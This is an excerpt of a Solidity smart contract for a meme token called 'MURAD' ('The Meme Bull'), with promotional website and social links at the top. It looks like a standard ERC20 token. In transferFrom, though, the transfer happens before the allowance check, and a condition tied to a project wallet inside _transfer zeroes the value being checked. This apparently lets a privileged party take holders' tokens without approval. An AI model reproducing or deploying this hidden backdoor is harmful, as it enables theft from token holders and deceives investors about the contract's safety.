...
/*
    ...
    https://muradoneth.vip
    https://t.me/muradoneth
    https://x.com/muradoneth
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferFrom(
        ...
        _muradmeme = amount; _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= _muradmeme,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - _muradmeme);
        }
...
contract MURAD is ERC20, Ownable {
    ...
    string private constant MEME = 'Meme Bull Murad';
    /******************/
    ...
    constructor() ERC20("The Meme Bull", "MURAD") payable{
    ...
    function _transfer(
        ...
        if(_isSenderCheck(projectWallet))_muradmeme = 0;
